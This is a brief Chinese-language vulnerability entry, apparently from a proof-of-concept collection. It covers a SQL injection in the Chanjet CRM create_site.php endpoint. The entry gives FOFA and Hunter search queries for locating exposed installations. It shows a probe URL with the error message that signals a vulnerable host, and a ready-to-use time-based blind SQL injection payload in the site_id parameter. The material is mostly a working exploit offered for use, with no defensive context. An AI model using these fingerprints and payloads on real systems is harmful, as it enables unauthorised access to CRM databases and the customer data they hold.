# 畅捷通 畅捷CRM create_site.php SQL注入漏洞

## 网络测绘

fofa: app="畅捷通-畅捷CRM"

hunter: web.title="畅捷CRM"

## POC / EXP

```
/WebSer~1/create_site.php?site_id=1
请求弹窗register fail,please again存在漏洞

/WebSer~1/create_site.php?site_id=1+AND+%28SELECT+6663+FROM+%28SELECT%28SLEEP%285%29%29%29lbcfz%29
```